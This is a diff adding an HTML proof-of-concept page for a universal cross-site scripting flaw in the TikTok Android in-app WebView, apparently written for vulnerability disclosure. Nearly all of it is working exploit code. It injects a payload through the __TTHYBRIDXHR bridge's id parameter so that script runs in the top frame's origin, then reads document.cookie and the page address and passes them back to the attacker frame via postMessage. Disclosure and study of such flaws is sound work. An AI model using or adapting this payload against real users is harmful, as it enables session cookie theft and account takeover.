@@ -1,0 +1,34 @@
+<!doctype html><meta charset=utf-8><title>TT UXSS PoC</title>
+<body style="font:13px/1.5 monospace;padding:8px;background:#fff3f3">
+<h3 style="margin:0 0 6px">ATTACKER FRAME &mdash; origin: <span id=me></span></h3>
+<pre id=o style="white-space:pre-wrap;word-break:break-all">waiting...</pre>
+<script>
+// z01dberg - TikTok Android __TTHYBRIDXHR id-parameter JS injection PoC
+// This page runs on an attacker origin. It is inert outside the TikTok in-app WebView.
+var out=[];
+function put(s){ out.push(s); document.getElementById('o').textContent = out.join("\n"); }
+document.getElementById('me').textContent = location.origin;
+put("frame is subframe: " + (window.top !== window.self));
+put("__TTHYBRIDXHR present: " + (typeof window.__TTHYBRIDXHR));
+
+window.addEventListener('message', function(e){
+  var d = e.data;
+  if (d && d.__uxss){
+    put("");
+    put("*** UXSS CONFIRMED ***");
+    put("script executed in origin : " + d.__uxss.o);
+    put("document.href            : " + d.__uxss.h);
+    put("document.cookie          : " + d.__uxss.c);
+    document.body.style.background = '#dfd';
+  }
+});
+
+// payload runs in the TOP frame's origin; single quotes only so it survives the JSON+JS nesting
+var payload = "(function(){var d={o:location.origin,h:location.href,c:document.cookie};"
+            + "for(var i=0;i<window.frames.length;i++){try{window.frames[i].postMessage({__uxss:d},'*')}catch(e){}}"
+            + "return ''})()";
+var msg = { method:'GET', id:'"+' + payload + '+"', url:'https://www.tiktok.com/robots.txt', headers:{} };
+try {
+  put("postMessage() -> " + String(window.__TTHYBRIDXHR.postMessage(JSON.stringify(msg))));
+} catch(e){ put("call failed: " + e); }
+</script>
